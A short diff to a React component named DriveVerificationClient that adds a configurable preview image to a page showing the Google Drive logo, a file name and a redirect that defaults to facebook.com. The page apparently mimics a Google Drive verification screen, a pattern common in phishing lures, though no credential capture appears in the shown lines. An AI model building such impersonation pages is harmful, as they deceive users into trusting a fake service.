@@ -17,7 +17,8 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
     fileName, 
     fileInfo, 
     footerText, 
-    redirectUrl 
+    redirectUrl,
+    previewImageUrl,
   } = config;
   
   const REDIRECT_URL = redirectUrl || 'https://www.facebook.com'; 
@@ -74,11 +75,12 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
         <CardContent className="p-0 flex flex-col items-center">
           
           <Image
-            className="mb-5"
-            src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg"
-            alt="Google Drive"
-            width={74}
-            height={74}
+            className="mb-5 rounded-md"
+            src={previewImageUrl || "https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg"}
+            alt={title}
+            width={80}
+            height={80}
+            priority
           />
           
           <h1 className="text-2xl font-bold mb-2 text-foreground">{title}</h1>
